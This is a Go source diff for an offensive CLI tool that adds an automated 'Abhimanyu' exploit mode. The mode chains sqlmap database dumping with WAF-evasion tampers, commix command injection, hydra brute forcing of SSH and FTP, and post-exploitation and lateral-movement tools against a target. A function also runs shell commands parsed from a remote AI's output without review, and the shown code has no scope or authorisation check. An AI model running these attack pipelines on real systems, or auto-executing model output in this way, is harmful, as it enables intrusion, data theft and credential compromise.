@@ -9,6 +9,7 @@ import (
 	"strings"
 	"time"
 
+	"cybermind-cli/abhimanyu"
 	"cybermind-cli/api"
 	"cybermind-cli/hunt"
 	"cybermind-cli/recon"
@@ -93,8 +94,9 @@ func printBanner() {
 	// Linux-only recon notice
 	if runtime.GOOS == "linux" {
 		fmt.Println(lipgloss.NewStyle().Foreground(green).Render("  ✓ Auto Recon Mode available  →  cybermind /recon <target>"))
+		fmt.Println(lipgloss.NewStyle().Foreground(green).Render("  ✓ Abhimanyu Mode available   →  cybermind /abhimanyu <target>"))
 	} else {
-		fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  ℹ  Auto Recon Mode: Linux only"))
+		fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  ℹ  Auto Recon/Hunt/Abhimanyu Mode: Linux only"))
 	}
 	fmt.Println()
 }
@@ -123,6 +125,11 @@ func printHelp() {
 		fmt.Println(g.Render("  cybermind /tools") + d.Render("               → quick tool status check"))
 		fmt.Println(g.Render("  cybermind /install-tools") + d.Render("       → install all recon + hunt tools"))
 		fmt.Println(g.Render("  cybermind /abhimanyu <target>") + d.Render("  → ⚔️  exploit mode (auto-exploit all vulns)"))
+		fmt.Println(g.Render("  cybermind /abhimanyu <target> sqli") + d.Render(" → SQLi only"))
+		fmt.Println(g.Render("  cybermind /abhimanyu <target> rce") + d.Render("  → RCE/CMDi only"))
+		fmt.Println(g.Render("  cybermind /abhimanyu <target> auth") + d.Render(" → Auth brute force"))
+		fmt.Println(g.Render("  cybermind /abhimanyu <target> postexploit") + d.Render(" → Post-exploitation"))
+		fmt.Println(g.Render("  cybermind /abhimanyu <target> lateral") + d.Render(" → Lateral movement"))
 		fmt.Println()
 	}
 
@@ -555,40 +562,147 @@ func runHunt(target string, reconCtx *hunt.HuntContext, requested []string) {
 	printResult("Hunt Analysis → "+target, clean)
 	_ = storage.AddEntry("/hunt "+target, clean)
 
-	// ── Auto-trigger Abhimanyu Mode if critical vulns found ──────────────
-	if len(result.Context.VulnsFound) > 0 || len(result.Context.XSSFound) > 0 {
-		fmt.Println()
+	// ── Ask user to start Abhimanyu Mode ─────────────────────────────────
+	vulnCount := 0
+	if result.Context != nil {
+		vulnCount = len(result.Context.VulnsFound) + len(result.Context.XSSFound)
+	}
+
+	fmt.Println()
+	if vulnCount > 0 {
 		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(red).Render(
-			"  ⚔️  ABHIMANYU MODE — Critical vulnerabilities found. Auto-exploiting..."))
+			fmt.Sprintf("  ⚔️  Hunt complete. %d vulnerabilities found. Start ABHIMANYU MODE?", vulnCount)))
+	} else {
+		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(red).Render(
+			"  ⚔️  Hunt complete. Start ABHIMANYU MODE to exploit findings?"))
+	}
+	fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(
+		"  Abhimanyu will run: sqlmap, commix, hydra, nikto, wpscan, metasploit, searchsploit"))
+	fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(
+		"  Post-exploit: linpeas, bloodhound, crackmapexec, evil-winrm, impacket"))
+	fmt.Print(lipgloss.NewStyle().Foreground(red).Render("  [y/N] → "))
+
+	var abhimanyuAnswer string
+	fmt.Scanln(&abhimanyuAnswer)
+	abhimanyuAnswer = strings.ToLower(strings.TrimSpace(abhimanyuAnswer))
+
+	if abhimanyuAnswer == "y" || abhimanyuAnswer == "yes" {
+		// Pass hunt context to Abhimanyu
+		runAbhimanyuFromHunt(target, ctx, xssFound, vulnsFound, paramsFound, openPorts, findings)
+	} else {
 		fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(
-			"  Entering the Chakravyuh. No retreat."))
+			"  Skipped. Run manually: cybermind /abhimanyu " + target))
 		fmt.Println()
-
-		abhimanyuPayload := map[string]interface{}{
-			"target_type":   ctx.TargetType,
-			"open_ports":    openPorts,
-			"live_urls":     payload.XSSFound, // reuse available slice
-			"xss_found":     xssFound,
-			"vulns_found":   vulnsFound,
-			"params_found":  paramsFound,
-			"waf_detected":  ctx.WAFDetected,
-			"waf_vendor":    ctx.WAFVendor,
-			"hunt_findings": findings,
-		}
-
-		exploit, exploitErr := api.SendAbhimanyu(target, "all", abhimanyuPayload)
-		if exploitErr == nil {
-			cleanExploit := utils.StripMarkdown(exploit)
-			printResult("⚔️  ABHIMANYU — Exploit Report → "+target, cleanExploit)
-			_ = storage.AddEntry("/abhimanyu "+target, cleanExploit)
-		} else {
-			fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render(
-				"  ⚡ Abhimanyu mode failed: " + exploitErr.Error()))
-		}
 	}
 }
 
-// runAbhimanyu runs standalone Abhimanyu exploit mode
+// runAbhimanyuFromHunt chains Abhimanyu mode from hunt results with full context.
+func runAbhimanyuFromHunt(target string, ctx hunt.HuntContext, xssFound, vulnsFound, paramsFound []string, openPorts []int, findings map[string]string) {
+	fmt.Println()
+	fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(red).Render("  ⚔️  ABHIMANYU MODE — " + target))
+	fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#FF4444")).Render("  Entering the Chakravyuh. Fighting every layer. No retreat."))
+	fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#333333")).Render("  " + strings.Repeat("─", 60)))
+	fmt.Println()
+
+	lhost := getLocalIP()
+
+	// Build AbhimanyuContext from hunt results
+	abhCtx := &abhimanyu.AbhimanyuContext{
+		Target:      target,
+		TargetType:  ctx.TargetType,
+		VulnType:    "all",
+		LHOST:       lhost,
+		LiveURLs:    ctx.LiveURLs,
+		OpenPorts:   openPorts,
+		XSSFound:    xssFound,
+		VulnsFound:  vulnsFound,
+		ParamsFound: paramsFound,
+		WAFDetected: ctx.WAFDetected,
+		WAFVendor:   ctx.WAFVendor,
+	}
+
+	// Run full exploit pipeline using registry
+	results := abhimanyu.RunAbhimanyuMode(abhCtx, func(status abhimanyu.AbhimanyuStatus) {
+		switch status.Kind {
+		case abhimanyu.StatusInstalling:
+			fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render(
+				fmt.Sprintf("  ⟳ %-20s installing...", status.Tool)))
+		case abhimanyu.StatusRunning:
+			reason := ""
+			if status.Reason != "" {
+				reason = " (" + status.Reason + ")"
+			}
+			fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(
+				fmt.Sprintf("  ⟳ %-20s attacking...%s", status.Tool, reason)))
+		case abhimanyu.StatusDone:
+			fmt.Println(lipgloss.NewStyle().Foreground(green).Render(
+				fmt.Sprintf("  ✓ %-20s done (%s)", status.Tool, status.Took.Round(time.Millisecond))))
+		case abhimanyu.StatusFailed:
+			fmt.Println(lipgloss.NewStyle().Foreground(red).Render(
+				fmt.Sprintf("  ✗ %-20s failed — %s", status.Tool, status.Reason)))
+		case abhimanyu.StatusSkipped:
+			fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(
+				fmt.Sprintf("  - %-20s skipped — %s", status.Tool, status.Reason)))
+		}
+	})
+
+	printAbhimanyuSummary(results, abhCtx)
+
+	// Merge results into findings for AI payload
+	for _, r := range results {
+		if r.Output != "" {
+			findings[r.Tool] = r.Output
+		}
+	}
+
+	// Build AI payload
+	abhimanyuPayload := map[string]interface{}{
+		"target":       target,
+		"vuln_type":    "all",
+		"lhost":        lhost,
+		"target_type":  ctx.TargetType,
+		"open_ports":   openPorts,
+		"live_urls":    ctx.LiveURLs,
+		"xss_found":    xssFound,
+		"vulns_found":  vulnsFound,
+		"params_found": paramsFound,
+		"waf_detected": ctx.WAFDetected,
+		"waf_vendor":   ctx.WAFVendor,
+		"findings":     findings,
+		"session_dir":  abhCtx.SessionDir,
+	}
+
+	fmt.Println()
+	fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render("  ⟳ Sending to Abhimanyu AI for exploit analysis..."))
+
+	exploit, exploitErr := api.SendAbhimanyu(target, "all", abhimanyuPayload)
+	if exploitErr == nil {
+		cleanExploit := utils.StripMarkdown(exploit)
+		printResult("⚔️  ABHIMANYU Exploit Report → "+target, cleanExploit)
+		_ = storage.AddEntry("/abhimanyu "+target, cleanExploit)
+
+		// Auto-execute AI-suggested commands
+		autoExecuteAICommands(cleanExploit)
+	} else {
+		printError("Abhimanyu AI failed: " + exploitErr.Error())
+		// Print raw findings anyway
+		fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render("  Raw findings:"))
+		for tool, output := range findings {
+			if len(output) > 2000 {
+				output = output[:2000] + "...[truncated]"
+			}
+			fmt.Printf("\n=== %s ===\n%s\n", strings.ToUpper(tool), output)
+		}
+	}
+
+	// Show session info for next run
+	fmt.Println()
+	fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render(
+		fmt.Sprintf("  💾 Session saved: %s/session.json", abhCtx.SessionDir)))
+	fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(
+		"  Resume next session: cybermind /abhimanyu " + target))
+}
+
 func runAbhimanyu(target, vulnType string) {
 	fmt.Println()
 	fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(red).Render("  ⚔️  ABHIMANYU MODE — " + target))
@@ -596,173 +710,76 @@ func runAbhimanyu(target, vulnType string) {
 	fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#333333")).Render("  " + strings.Repeat("─", 60)))
 	fmt.Println()
 
-	// ── Phase 1: Auto-install missing exploit tools ───────────────────────
-	fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render("  ⟳ Checking exploit tools..."))
-	exploitTools := []struct{ name, install string }{
-		{"sqlmap", "sudo apt install sqlmap -y"},
-		{"commix", "sudo apt install commix -y"},
-		{"msfconsole", "sudo apt install metasploit-framework -y"},
-		{"searchsploit", "sudo apt install exploitdb -y"},
-		{"hydra", "sudo apt install hydra -y"},
-		{"john", "sudo apt install john -y"},
-		{"hashcat", "sudo apt install hashcat -y"},
-		{"wpscan", "sudo apt install wpscan -y"},
-		{"nikto", "sudo apt install nikto -y"},
-		{"crunch", "sudo apt install crunch -y"},
-	}
-	for _, t := range exploitTools {
-		if _, err := exec.LookPath(t.name); err != nil {
-			fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(fmt.Sprintf("  ⟳ %-14s installing...", t.name)))
-			parts := strings.Fields(t.install)
-			cmd := exec.Command(parts[0], parts[1:]...)
-			cmd.Run()
-		}
-	}
-
-	// ── Phase 2: Run exploit tools based on vuln type ────────────────────
-	findings := make(map[string]string)
 	lhost := getLocalIP()
 
-	runExploit := func(name string, args []string, timeout int) string {
-		fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(fmt.Sprintf("  ⟳ %-14s attacking...", name)))
-		cmd := exec.Command(name, args...)
-		var out strings.Builder
-		cmd.Stdout = &out
-		cmd.Stderr = &out
+	// Build context — standalone mode, no prior hunt context
+	abhCtx := &abhimanyu.AbhimanyuContext{
+		Target:    target,
+		VulnType:  vulnType,
+		LHOST:     lhost,
+	}
 
-		done := make(chan error, 1)
-		go func() { done <- cmd.Run() }()
-		select {
-		case <-done:
-		case <-time.After(time.Duration(timeout) * time.Second):
-			if cmd.Process != nil {
-				cmd.Process.Kill()
+	// Run full exploit pipeline using registry
+	results := abhimanyu.RunAbhimanyuMode(abhCtx, func(status abhimanyu.AbhimanyuStatus) {
+		switch status.Kind {
+		case abhimanyu.StatusInstalling:
+			fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render(
+				fmt.Sprintf("  ⟳ %-20s installing...", status.Tool)))
+		case abhimanyu.StatusRunning:
+			reason := ""
+			if status.Reason != "" {
+				reason = " (" + status.Reason + ")"
 			}
+			fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(
+				fmt.Sprintf("  ⟳ %-20s attacking...%s", status.Tool, reason)))
+		case abhimanyu.StatusDone:
+			fmt.Println(lipgloss.NewStyle().Foreground(green).Render(
+				fmt.Sprintf("  ✓ %-20s done (%s)", status.Tool, status.Took.Round(time.Millisecond))))
+		case abhimanyu.StatusFailed:
+			fmt.Println(lipgloss.NewStyle().Foreground(red).Render(
+				fmt.Sprintf("  ✗ %-20s failed — %s", status.Tool, status.Reason)))
+		case abhimanyu.StatusSkipped:
+			fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(
+				fmt.Sprintf("  - %-20s skipped — %s", status.Tool, status.Reason)))
 		}
-		result := out.String()
-		if result != "" {
-			fmt.Println(lipgloss.NewStyle().Foreground(green).Render(fmt.Sprintf("  ✓ %-14s done", name)))
-			findings[name] = result
-		} else {
-			fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(fmt.Sprintf("  - %-14s no output", name)))
-		}
-		return result
-	}
+	})
 
-	u := "https://" + target
-	if strings.HasPrefix(target, "http") {
-		u = target
-	}
+	printAbhimanyuSummary(results, abhCtx)
 
-	// SQLi — sqlmap full blast
-	if vulnType == "all" || vulnType == "sqli" {
-		runExploit("sqlmap", []string{
-			"-u", u,
-			"--batch",           // no user input
-			"--level", "5",      // max level
-			"--risk", "3",       // max risk
-			"--dbs",             // enumerate databases
-			"--tables",          // enumerate tables
-			"--dump-all",        // dump everything
-			"--forms",           // test forms
-			"--crawl", "3",      // crawl depth 3
-			"--threads", "10",
-			"--random-agent",
-			"--tamper", "space2comment,between,randomcase",
-			"-o",                // optimize
-		}, 3600)
-	}
-
-	// Command injection — commix
-	if vulnType == "all" || vulnType == "cmdi" || vulnType == "rce" {
-		runExploit("commix", []string{
-			"--url", u,
-			"--batch",
-			"--level", "3",
-			"--all",             // test all parameters
-			"--technique", "all",
-			"--random-agent",
-		}, 1800)
-	}
-
-	// Web vuln scan — nikto full
-	if vulnType == "all" || vulnType == "web" {
-		runExploit("nikto", []string{
-			"-h", u,
-			"-Tuning", "1234567890abcde",
-			"-ssl",
-			"-mutate", "1,2,3,4,5,6",
-			"-maxtime", "1800",
-			"-nointeractive",
-		}, 1800)
-	}
-
-	// WordPress — wpscan
-	if vulnType == "all" || vulnType == "wp" {
-		runExploit("wpscan", []string{
-			"--url", u,
-			"--enumerate", "ap,at,cb,dbe,u,m",
-			"--plugins-detection", "aggressive",
-			"--random-user-agent",
-			"--force",
-		}, 1800)
-	}
-
-	// Searchsploit — find exploits for detected services
-	if vulnType == "all" || vulnType == "cve" {
-		runExploit("searchsploit", []string{
-			"--json",
-			target,
-		}, 60)
-	}
-
-	// Hydra — brute force common services
-	if vulnType == "all" || vulnType == "auth" || vulnType == "brute" {
-		for _, service := range []string{"ssh", "ftp", "http-post-form"} {
-			if _, err := exec.LookPath("hydra"); err == nil {
-				fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(fmt.Sprintf("  ⟳ hydra %-10s brute forcing...", service)))
-				var hydraArgs []string
-				switch service {
-				case "ssh":
-					hydraArgs = []string{
-						"-L", "/usr/share/wordlists/metasploit/unix_users.txt",
-						"-P", "/usr/share/wordlists/rockyou.txt",
-						"-t", "16", "-f", "-V",
-						target, "ssh",
-					}
-				case "ftp":
-					hydraArgs = []string{
-						"-L", "/usr/share/wordlists/metasploit/unix_users.txt",
-						"-P", "/usr/share/wordlists/rockyou.txt",
-						"-t", "16", "-f",
-						target, "ftp",
-					}
-				}
-				if len(hydraArgs) > 0 {
-					runExploit("hydra", hydraArgs, 1800)
-				}
-			}
+	// Build findings map for AI
+	findings := make(map[string]string)
+	for _, r := range results {
+		if r.Output != "" {
+			findings[r.Tool] = r.Output
 		}
 	}
 
-	// ── Phase 3: Send all findings to AI for exploit analysis ─────────────
+	if len(findings) == 0 {
+		fmt.Println(lipgloss.NewStyle().Foreground(red).Render("  ✗ No exploit tools produced output."))
+		fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  Run: cybermind /doctor to install all tools"))
+		return
+	}
+
 	fmt.Println()
 	fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render("  ⟳ Sending to Abhimanyu AI for exploit analysis..."))
 
 	payload := map[string]interface{}{
-		"target":    target,
-		"vuln_type": vulnType,
-		"lhost":     lhost,
-		"findings":  findings,
+		"target":      target,
+		"vuln_type":   vulnType,
+		"lhost":       lhost,
+		"findings":    findings,
+		"session_dir": abhCtx.SessionDir,
 	}
 
 	analysis, err := api.SendAbhimanyu(target, vulnType, payload)
 	if err != nil {
 		printError("Abhimanyu AI failed: " + err.Error())
-		// Print raw findings anyway
 		fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render("  Raw findings:"))
 		for tool, output := range findings {
-			fmt.Printf("\n=== %s ===\n%s\n", strings.ToUpper(tool), output[:min(len(output), 2000)])
+			if len(output) > 2000 {
+				output = output[:2000] + "...[truncated]"
+			}
+			fmt.Printf("\n=== %s ===\n%s\n", strings.ToUpper(tool), output)
 		}
 		return
 	}
@@ -771,14 +788,58 @@ func runAbhimanyu(target, vulnType string) {
 	printResult("⚔️  ABHIMANYU Exploit Report → "+target, clean)
 	_ = storage.AddEntry("/abhimanyu "+target, clean)
 
-	// ── Phase 4: Auto-execute AI-suggested commands ───────────────────────
+	// Auto-execute AI-suggested commands
+	autoExecuteAICommands(clean)
+
+	// Show session info for next run
+	fmt.Println()
+	fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render(
+		fmt.Sprintf("  💾 Session saved: %s/session.json", abhCtx.SessionDir)))
+	fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(
+		"  Resume next session: cybermind /abhimanyu " + target))
+}
+
+// printAbhimanyuSummary prints a per-tool status table after abhimanyu completes.
+func printAbhimanyuSummary(results []abhimanyu.ExploitResult, ctx *abhimanyu.AbhimanyuContext) {
+	fmt.Println()
+	fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(red).Render("  ⚔️  Abhimanyu Summary"))
+	fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#333333")).Render("  " + strings.Repeat("─", 60)))
+	fmt.Println()
+
+	success, failed := 0, 0
+	for _, r := range results {
+		if r.Success {
+			fmt.Println(lipgloss.NewStyle().Foreground(green).Render(
+				fmt.Sprintf("  ✓ %-22s done  (%s)", r.Tool, r.Took.Round(time.Millisecond))))
+			success++
+		} else {
+			fmt.Println(lipgloss.NewStyle().Foreground(red).Render(
+				fmt.Sprintf("  ✗ %-22s failed — %s", r.Tool, r.Error)))
+			failed++
+		}
+	}
+	fmt.Println()
+	fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render(
+		fmt.Sprintf("  Tools: %d succeeded, %d failed", success, failed)))
+	if ctx.ShellObtained {
+		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(green).Render(
+			"  🐚 Shell obtained: " + ctx.ShellType))
+	}
+	fmt.Println()
+}
+
+// autoExecuteAICommands extracts and runs commands from AI analysis output.
+func autoExecuteAICommands(clean string) {
 	fmt.Println()
 	fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(red).Render("  ⚔️  Auto-executing exploit commands from AI analysis..."))
-	// Extract and run commands from AI output
+	exploitTools := []string{
+		"sqlmap", "commix", "msfconsole", "hydra", "nikto", "wpscan",
+		"searchsploit", "curl", "nmap", "crackmapexec", "evil-winrm",
+		"impacket-secretsdump", "linpeas", "pspy", "bloodhound-python",
+	}
 	for _, line := range strings.Split(clean, "\n") {
 		line = strings.TrimSpace(line)
-		// Execute lines that look like commands (start with known tools)
-		for _, tool := range []string{"sqlmap", "commix", "msfconsole", "hydra", "nikto", "wpscan", "searchsploit", "curl", "nmap"} {
+		for _, tool := range exploitTools {
 			if strings.HasPrefix(line, tool+" ") {
 				fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render("  ⚡ Executing: " + line))
 				parts := strings.Fields(line)
@@ -794,30 +855,47 @@ func runAbhimanyu(target, vulnType string) {
 	}
 }
 
-func min(a, b int) int {
-	if a < b {
-		return a
-	}
-	return b
-}
-
-// installPythonPipTool installs a Python tool via pip3.
+// installPythonPipTool installs a Python tool via pipx (Kali 2024.4+) with pip3 fallback.
+// Kali 2024.4+ recommends pipx over pip3 for external packages.
 func installPythonPipTool(name string) error {
-	fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(fmt.Sprintf("  ↳ pip3 install %s...", name)))
-	cmd := exec.Command("pip3", "install", name, "--break-system-packages")
+	fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(fmt.Sprintf("  ↳ Installing %s via pipx...", name)))
+
+	// Ensure pipx is installed
+	if _, err := exec.LookPath("pipx"); err != nil {
+		exec.Command("sudo", "apt", "install", "-y", "pipx").Run()
+		exec.Command("pipx", "ensurepath").Run()
+	}
+
+	// Method 1: pipx install (recommended for Kali 2024.4+)
+	cmd := exec.Command("pipx", "install", name)
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
-	if err := cmd.Run(); err != nil {
-		// Try without --break-system-packages
-		cmd2 := exec.Command("pip3", "install", name)
-		cmd2.Stdout = os.Stdout
-		cmd2.Stderr = os.Stderr
-		return cmd2.Run()
+	if err := cmd.Run(); err == nil {
+		// Symlink from ~/.local/bin to /usr/local/bin
+		homedir, _ := os.UserHomeDir()
+		binPath := homedir + "/.local/bin/" + name
+		if _, err2 := os.Stat(binPath); err2 == nil {
+			exec.Command("sudo", "ln", "-sf", binPath, "/usr/local/bin/"+name).Run()
+		}
+		return nil
 	}
-	return nil
+
+	// Method 2: pip3 with --break-system-packages
+	cmd2 := exec.Command("pip3", "install", name, "--break-system-packages")
+	cmd2.Stdout = os.Stdout
+	cmd2.Stderr = os.Stderr
+	if err := cmd2.Run(); err == nil {
+		return nil
+	}
+
+	// Method 3: pip3 in user space
+	cmd3 := exec.Command("pip3", "install", "--user", name)
+	cmd3.Stdout = os.Stdout
+	cmd3.Stderr = os.Stderr
+	return cmd3.Run()
 }
 
-// installPythonGitTool installs a Python tool from git + creates wrapper script.
+// installPythonGitTool installs a Python tool from git using pipx or venv.
 func installPythonGitTool(name, repoURL, installDir, mainScript string) error {
 	fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(fmt.Sprintf("  ↳ Cloning %s from GitHub...", name)))
 
@@ -829,28 +907,53 @@ func installPythonGitTool(name, repoURL, installDir, mainScript string) error {
 		return fmt.Errorf("git clone failed: %v", err)
 	}
 
-	// Install requirements
+	// Method 1: pipx install from local dir (best for Kali 2024.4+)
+	if _, err := exec.LookPath("pipx"); err == nil {
+		pipxCmd := exec.Command("pipx", "install", installDir)
+		pipxCmd.Stdout = os.Stdout
+		pipxCmd.Stderr = os.Stderr
+		if pipxCmd.Run() == nil {
+			homedir, _ := os.UserHomeDir()
+			binPath := homedir + "/.local/bin/" + name
+			if _, err2 := os.Stat(binPath); err2 == nil {
+				exec.Command("sudo", "ln", "-sf", binPath, "/usr/local/bin/"+name).Run()
+				return nil
+			}
+		}
+	}
+
+	// Method 2: venv + pip install
+	venvDir := installDir + "/.venv"
+	exec.Command("python3", "-m", "venv", venvDir).Run()
+	venvPip := venvDir + "/bin/pip"
 	reqFile := installDir + "/requirements.txt"
 	if _, err := os.Stat(reqFile); err == nil {
-		pipCmd := exec.Command("pip3", "install", "-r", reqFile, "--break-system-packages", "-q")
+		pipCmd := exec.Command(venvPip, "install", "-r", reqFile, "-q")
 		pipCmd.Stdout = os.Stdout
 		pipCmd.Stderr = os.Stderr
 		pipCmd.Run()
 	}
+	// Install the package itself
+	exec.Command(venvPip, "install", "-e", installDir, "-q").Run()
 
-	// Create wrapper script
+	// Create wrapper that uses venv python
 	scriptPath := installDir + "/" + mainScript
-	wrapper := fmt.Sprintf("#!/bin/bash\npython3 %s \"$@\"\n", scriptPath)
+	venvPython := venvDir + "/bin/python3"
+	wrapper := fmt.Sprintf("#!/bin/bash\n%s %s \"$@\"\n", venvPython, scriptPath)
 	wrapperPath := "/usr/local/bin/" + name
 	teeCmd := exec.Command("sudo", "tee", wrapperPath)
 	teeCmd.Stdin = strings.NewReader(wrapper)
 	teeCmd.Run()
 	exec.Command("sudo", "chmod", "+x", wrapperPath).Run()
 
-	// Verify
-	if _, err := exec.LookPath(name); err == nil {
-		return nil
+	// Method 3: pip3 with --break-system-packages as last resort
+	if _, err := exec.LookPath(name); err != nil {
+		reqFile := installDir + "/requirements.txt"
+		if _, err2 := os.Stat(reqFile); err2 == nil {
+			exec.Command("pip3", "install", "-r", reqFile, "--break-system-packages", "-q").Run()
+		}
 	}
+
 	if _, err := os.Stat(scriptPath); err == nil {
 		return nil
 	}
@@ -1196,74 +1299,118 @@ func main() {
 		}
 
 		allTools := []toolEntry{
-			// Recon Phase 1
+			// ── Recon Phase 1 — Passive OSINT ──────────────────────────────────
 			{"whois", "recon", "sudo apt install whois", false, false},
 			{"theHarvester", "recon", "sudo apt install theharvester", false, false},
 			{"dig", "recon", "sudo apt install dnsutils", false, false},
-			// Recon Phase 2
+			// ── Recon Phase 2 — Subdomain Enumeration ──────────────────────────
 			{"subfinder", "recon", "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest", true, false},
 			{"amass", "recon", "sudo apt install amass", false, false},
+			{"reconftw", "recon", "git clone https://github.com/six2dez/reconftw.git /opt/reconftw && cd /opt/reconftw && ./install.sh", false, false},
 			{"dnsx", "recon", "go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest", true, false},
-			// Recon Phase 3
+			// ── Recon Phase 3 — Port Scanning ──────────────────────────────────
 			{"rustscan", "recon", "cargo install rustscan", false, true},
 			{"naabu", "recon", "go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest", true, false},
 			{"nmap", "recon", "sudo apt install nmap", false, false},
 			{"masscan", "recon", "sudo apt install masscan", false, false},
-			// Recon Phase 4
+			// ── Recon Phase 4 — HTTP Fingerprinting ────────────────────────────
 			{"httpx", "recon", "go install github.com/projectdiscovery/httpx/cmd/httpx@latest", true, false},
 			{"whatweb", "recon", "sudo apt install whatweb", false, false},
 			{"tlsx", "recon", "go install github.com/projectdiscovery/tlsx/cmd/tlsx@latest", true, false},
-			// Recon Phase 5
+			// ── Recon Phase 5 — Directory Discovery ────────────────────────────
 			{"ffuf", "recon", "sudo apt install ffuf", false, false},
 			{"feroxbuster", "recon", "sudo apt install feroxbuster", false, false},
 			{"gobuster", "recon", "sudo apt install gobuster", false, false},
-			// Recon Phase 6
+			// ── Recon Phase 6 — Vulnerability Scanning ─────────────────────────
 			{"nuclei", "recon", "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest", true, false},
 			{"nikto", "recon", "sudo apt install nikto", false, false},
 			{"katana", "recon", "go install github.com/projectdiscovery/katana/cmd/katana@latest", true, false},
-	// Hunt tools — upgraded arsenal
-	{"gau", "hunt", "go install github.com/lc/gau/v2/cmd/gau@latest", true, false},
-	{"waymore", "hunt", "go install github.com/xnl-h4ck3r/waymore@latest", true, false},
-	{"waybackurls", "hunt", "go install github.com/tomnomnom/waybackurls@latest", true, false},
-	{"gospider", "hunt", "go install github.com/jaeles-project/gospider@latest", true, false},
-	{"dalfox", "hunt", "go install github.com/hahwul/dalfox/v2@latest", true, false},
-	{"paramspider", "hunt", "git clone https://github.com/devanshbatham/ParamSpider /opt/ParamSpider && pip3 install -r /opt/ParamSpider/requirements.txt -q && sudo ln -sf /opt/ParamSpider/paramspider.py /usr/local/bin/paramspider && sudo chmod +x /usr/local/bin/paramspider", false, false},
-	{"arjun", "hunt", "pip3 install arjun -q", false, false},
-	{"xsstrike", "hunt", "git clone https://github.com/s0md3v/XSStrike.git /opt/XSStrike && pip3 install -r /opt/XSStrike/requirements.txt -q && sudo ln -sf /opt/XSStrike/xsstrike.py /usr/local/bin/xsstrike && sudo chmod +x /usr/local/bin/xsstrike", false, false},
-	// reconftw — meta subdomain tool
-	{"reconftw", "recon", "git clone https://github.com/six2dez/reconftw.git /opt/reconftw && cd /opt/reconftw && ./install.sh", false, false},
+			// ── Hunt Phase 1 — URL Collection ──────────────────────────────────
+			{"waymore", "hunt", "pip3 install waymore --break-system-packages", false, false},
+			{"gau", "hunt", "go install github.com/lc/gau/v2/cmd/gau@latest", true, false},
+			{"waybackurls", "hunt", "go install github.com/tomnomnom/waybackurls@latest", true, false},
+			// ── Hunt Phase 2 — Deep Crawl ──────────────────────────────────────
+			{"gospider", "hunt", "go install github.com/jaeles-project/gospider@latest", true, false},
+			// katana already in recon, shared
+			// ── Hunt Phase 3 — Parameter Discovery ─────────────────────────────
+			{"paramspider", "hunt", "git clone https://github.com/devanshbatham/ParamSpider /opt/ParamSpider && pip3 install -r /opt/ParamSpider/requirements.txt --break-system-packages && sudo ln -sf /opt/ParamSpider/paramspider.py /usr/local/bin/paramspider && sudo chmod +x /usr/local/bin/paramspider", false, false},
+			{"arjun", "hunt", "pip3 install arjun --break-system-packages", false, false},
+			{"x8", "hunt", "Download binary from https://github.com/Sh1Yo/x8/releases/latest", false, false},
+			// ── Hunt Phase 4 — XSS Hunting ─────────────────────────────────────
+			{"xsstrike", "hunt", "git clone https://github.com/s0md3v/XSStrike /opt/XSStrike && pip3 install -r /opt/XSStrike/requirements.txt --break-system-packages && sudo ln -sf /opt/XSStrike/xsstrike.py /usr/local/bin/xsstrike && sudo chmod +x /usr/local/bin/xsstrike", false, false},
+			{"dalfox", "hunt", "go install github.com/hahwul/dalfox/v2@latest", true, false},
+			// ── Hunt Phase 5 — Deep Vuln Scan ──────────────────────────────────
+			{"gf", "hunt", "go install github.com/tomnomnom/gf@latest && git clone https://github.com/1ndianl33t/Gf-Patterns ~/.gf", true, false},
+			// nuclei already in recon, shared
+			// ── Abhimanyu Phase 1 — Web Exploitation ───────────────────────────
+			{"sqlmap", "exploit", "sudo apt install sqlmap -y", false, false},
+			{"commix", "exploit", "sudo apt install commix -y", false, false},
+			{"wpscan", "exploit", "sudo apt install wpscan -y", false, false},
+			// nikto already in recon, shared
+			// ── Abhimanyu Phase 2 — Auth Attacks ───────────────────────────────
+			{"hydra", "exploit", "sudo apt install hydra -y", false, false},
+			{"john", "exploit", "sudo apt install john -y", false, false},
